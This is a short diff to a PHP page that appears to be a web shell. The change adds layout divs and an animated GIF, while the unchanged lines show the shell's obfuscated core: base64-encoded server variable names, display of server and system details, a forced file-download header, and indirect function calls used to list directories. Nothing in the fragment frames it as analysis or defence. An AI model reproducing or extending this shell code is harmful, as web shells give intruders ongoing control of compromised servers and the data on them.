@@ -406,6 +406,7 @@ button, input:hover {
 </head>
 <body>
 <div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid #4200ac;border-radius:5px;">
+    <div class="separate-table">
         <li>Your IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
         <li>Server IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
         <li>Server : <span style="color: #00ff00;"><?php echo php_uname(); ?></span></li>
@@ -458,6 +459,10 @@ header(base64_decode('Q29udGVudC1kaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ig
 FA:
 ?>
         </li>
+    </div>
+    <div class="separate-gif">
+        <img src="https://c.tenor.com/ZQndYO4NwBcAAAAC/tenor.gif" alt="gif">
+    </div>
 </div>
 <div class="table-responsive text-light" style="text-align: left;padding: 4px;margin-bottom: 3px;margin-top: 3px;border: 2px solid #4200ac;border-radius:5px;">
 <li>Dir : <span><?php $Op = $c8[4](base64_decode('LyhcXHxcLykv'), $Jd);
